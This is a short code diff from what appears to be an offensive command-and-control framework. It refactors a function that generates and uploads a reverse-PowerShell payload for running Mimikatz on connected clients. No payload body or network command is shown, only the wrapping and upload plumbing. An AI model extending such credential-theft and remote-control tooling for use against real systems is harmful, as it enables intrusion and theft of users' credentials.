@@ -140,8 +140,7 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
 
 #update this
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
-    json = '{"type":"script", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
-    clientnumber = int(checkClientUpload(payloadname,json,isExe=False))
+    clientnumber = int(clientUpload(payloadname,payloadchoice,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     from stager import returnServerList
     try:
         for server in returnServerList():
